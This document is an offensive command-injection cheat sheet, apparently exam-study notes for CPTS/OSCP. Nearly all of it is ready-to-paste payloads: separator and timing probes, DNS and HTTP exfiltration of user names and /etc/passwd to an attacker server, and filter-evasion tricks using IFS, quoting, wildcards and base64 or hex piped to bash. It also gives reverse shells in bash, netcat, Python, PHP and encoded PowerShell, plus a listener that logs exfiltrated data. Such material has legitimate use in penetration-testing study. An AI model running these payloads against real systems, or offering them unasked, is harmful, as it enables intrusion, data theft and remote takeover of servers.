# Command Injection Complete

> OS Command Injection complete reference for CPTS/OSCP exams. All command separators, blind exfiltration, and evasion techniques.

---

## 1. Detection

### Command Separators

```bash
# Linux/Unix separators
;           # Semicolon - command chaining
|           # Pipe - sends output to next command
||          # OR - runs if first fails
&           # Background - runs regardless
&&          # AND - runs if first succeeds
`cmd`       # Backtick - command substitution
$(cmd)      # Subshell - command substitution
%0a         # Newline (URL-encoded)
\n          # Newline (via CRLF injection)

# Windows-specific separators
|           # Pipe
||          # OR
&           # Background
&&          # AND
%0a         # Newline (URL-encoded)
```

### Detection Payloads

```bash
# Simple test - use sleep/ping to verify execution
?ip=127.0.0.1; sleep 5
?ip=127.0.0.1| sleep 5
?ip=127.0.0.1|| sleep 5
?ip=127.0.0.1& sleep 5
?ip=127.0.0.1&& sleep 5
?ip=127.0.0.1`sleep 5`
?ip=127.0.0.1$(sleep 5)

# Windows alternatives
?ip=127.0.0.1 & ping -n 5 127.0.0.1
?ip=127.0.0.1 | timeout 5

# Output-based detection
?ip=127.0.0.1; id
?ip=127.0.0.1| whoami
?ip=127.0.0.1; echo COMMAND_INJECTION
?ip=127.0.0.1||dir

# Detect with timing (time-based)
time curl -s "http://target.com/ping?ip=127.0.0.1; sleep 5"
time curl -s "http://target.com/ping?ip=127.0.0.1; ping -c 5 127.0.0.1"
```

### Common Command Injection Parameters

```txt
?ip=
?host=
?ping=
?traceroute=
?cmd=
?command=
?exec=
?execute=
?run=
?shell=
?system=
?domain=
?server=
?hostname=
?target=
?dst=
?out=
?path=
?dir=
?folder=
```

### Parameter Fuzzing for Command Injection

```bash
ffuf -u "http://target.com/FUZZ=127.0.0.1;id" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "uid=|gid=|root"  # Match if id command output appears
```

---

## 2. Blind Injection with Out-of-Band Exfiltration

### DNS Exfiltration

```bash
# Exfiltrate data via DNS queries
?ip=127.0.0.1; nslookup `whoami`.YOUR_SERVER.com
?ip=127.0.0.1| nslookup `whoami`.YOUR_SERVER.com
?ip=127.0.0.1; host `hostname`.YOUR_SERVER.com

# Windows DNS exfil
?ip=127.0.0.1 & nslookup %username%.YOUR_SERVER.com
?ip=127.0.0.1 & for /f %i in ('whoami') do nslookup %i.YOUR_SERVER.com

# Base64 encode for clean DNS names
?ip=127.0.0.1; nslookup `echo $(whoami|base64|tr -d '\n')`.YOUR_SERVER.com
```

### HTTP Exfiltration

```bash
# Exfiltrate via curl/wget
?ip=127.0.0.1; curl http://YOUR_SERVER/`whoami`
?ip=127.0.0.1; wget --post-data="user=$(whoami)" http://YOUR_SERVER/capture

# More complex data
?ip=127.0.0.1; curl http://YOUR_SERVER/`cat /etc/passwd | base64 | tr -d '\n'`

# Linux
?ip=127.0.0.1; curl -s http://YOUR_SERVER/$(id|base64 -w0)
?ip=127.0.0.1; curl -X POST -d "$(cat /etc/passwd)" http://YOUR_SERVER/

# Windows PowerShell
?ip=127.0.0.1 & powershell Invoke-WebRequest -Uri http://YOUR_SERVER/$env:username
?ip=127.0.0.1 & powershell -c "Invoke-WebRequest -Uri http://YOUR_SERVER/?user=$env:username"
```

### Listener for OOB Exfiltration

```bash
# Start listener to catch exfiltrated data
sudo python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f'EXFIL: {self.path}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        logging.info(f'EXFIL POST: {body}')
        self.send_response(200)
        self.end_headers()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"

# Alternative: nc for DNS
sudo tcpdump -i tun0 port 53

# Alternative: interactsh for automatic callback
interactsh-client
```

---

## 3. Filter Evasion

### Space Filter Bypass

```bash
# Using tabs (%09)
?ip=127.0.0.1%09;%09id

# Using ${IFS} (Internal Field Separator)
?ip=127.0.0.1;${IFS}id
?ip=127.0.0.1;cat${IFS}/etc/passwd

# Using brace expansion
?ip=127.0.0.1;{cat,/etc/passwd}

# Using $IFS with curl
?ip=127.0.0.1;curl$IFS-FS"data=$(cat/etc/passwd)"$IFShttp://YOUR_SERVER/
```

### Quoting Techniques

```bash
# Quotes break keyword detection
?ip=127.0.0.1;c'a't${IFS}/etc/passwd
?ip=127.0.0.1;c"a"t${IFS}/etc/passwd
?ip=127.0.0.1;c'''a'''t${IFS}/etc/passwd

# Quote insertion without changing meaning
?ip=127.0.0.1;w'h'o'a'm'i
?ip=127.0.0.1;w"h"o"a"m"i
```

### Wildcard Bypass

```bash
# Use wildcards instead of specific commands
?ip=127.0.0.1;/???/??t /???/p??s??  # /bin/cat /etc/passwd
?ip=127.0.0.1;/???/c?t /???/p??s??

# Less common command locations
?ip=127.0.0.1;/usr/bin/id
?ip=127.0.0.1;/usr/bin/whoami
```

### Base64 Encoding

```bash
# Encode command, then decode and pipe to shell
# Example: encode "whoami" -> decode -> execute
?ip=127.0.0.1;echo d2hvYW1pCg==|base64 -d|bash
?ip=127.0.0.1;echo d2hvYW1p|base64 -d|sh

# More complex payloads
# echo "cat /etc/passwd" | base64
echo Y2F0IC9ldGMvcGFzc3dkCg==|base64 -d|bash

# Base64 encode entire script
echo BASE64_ENCODED_SCRIPT | base64 -d | bash

# PowerShell (Windows) base64
?ip=127.0.0.1 & powershell -e aQBkAA==  # base64 "id"
?ip=127.0.0.1 & powershell -Command "Invoke-Expression $(echo 'id' | base64)"
```

### Keyword Blacklist Bypass

```bash
# If "cat" is blocked, try:
?ip=127.0.0.1;tac /etc/passwd      # Reverse output
?ip=127.0.0.1;head /etc/passwd      # First lines
?ip=127.0.0.1;tail /etc/passwd      # Last lines
?ip=127.0.0.1;less /etc/passwd      # Pager
?ip=127.0.0.1;more /etc/passwd      # Pager
?ip=127.0.0.1;nl /etc/passwd       # Numbered lines
?ip=127.0.0.1;sort /etc/passwd     # Sorted
?ip=127.0.0.1;grep . /etc/passwd   # With grep
?ip=127.0.0.1;awk 1 /etc/passwd    # With awk
?ip=127.0.0.1;sed -n '1,$p' /etc/passwd  # With sed
?ip=127.0.0.1;strings /etc/passwd  # With strings
?ip=127.0.0.1;rev /etc/passwd      # Reverse characters

# If /etc/passwd is blocked, use wildcards
?ip=127.0.0.1;cat /???/p??s??

# If specific command characters are blocked
?ip=127.0.0.1;\x63\x61\x74 /etc/passwd  # hex encoding (bash $'...')
?ip=127.0.0.1;$'\x63\x61\x74' /etc/passwd
```

### Chaining Multiple Bypasses

```bash
# Combined: space bypass + base64 + keyword evasion
?ip=127.0.0.1;echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash

# Hex encoding + substitution
?ip=127.0.0.1;echo${IFS}636174202f6574632f706173737764|xxd${IFS}-r${IFS}-p|bash
```

---

## 4. Reverse Shells via Command Injection

### Linux Reverse Shell Payloads

```bash
# Bash
?ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
?ip=127.0.0.1;sh -i >& /dev/tcp/YOUR_IP/4444 0>&1

# URL-encoded for HTTP
%3Bbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27

# Netcat
?ip=127.0.0.1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f

# Python
?ip=127.0.0.1;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP (if available)
?ip=127.0.0.1;php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Windows Reverse Shell Payloads

```bash
# PowerShell
?ip=127.0.0.1 & powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$st=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ' + (iex $d) + '`n');$s.Write($st,0,$st.Length);$s.Flush()};$c.Close()"

# URL-encoded PowerShell reverse shell
?ip=127.0.0.1 & powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAWQBPAFUAUgBfAEkAUAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACQAcwB0ACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkARQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBQAFMAIAAnACsAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAArACcAPgAgACcAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAdAAsADAALAAkAHMAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

---

## 5. Command Execution Extraction

### Linux Common Commands

```bash
# System info
id
whoami
hostname
uname -a
cat /etc/os-release
cat /etc/passwd
ls -la /home/

# Network
ifconfig
ip addr
netstat -an
ss -tuln

# Processes
ps aux
ps -ef
top -bn1

# File system
find / -type f -name "*.txt" 2>/dev/null
find / -type f -name "config*" 2>/dev/null
ls -la /var/www/

# Credentials
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "DB_PASSWORD" /var/www/html/ 2>/dev/null
```

---

## Quick Reference - Copy/Paste Commands

```bash
# Detect command injection
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -n 5 127.0.0.1 &

# Blind detection
; curl http://YOUR_IP/
| nslookup UNIQUE.oastify.com

# Read files
; cat /etc/passwd
| type C:\Windows\win.ini

# Reverse shell
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

---

## Related Topics

- [[../../3.1 Recon and Discovery/ffuf Mastery]] - Parameter fuzzing
- [[../../3.1 Recon and Discovery/Web Recon Methodology]] - Identify input fields
- [[../3.4 LFI RFI/LFI RFI Path Traversal Complete]] - File read via injection
- [[../3.7 File Upload Attacks/File Upload Attacks Complete]] - Shell upload via injection
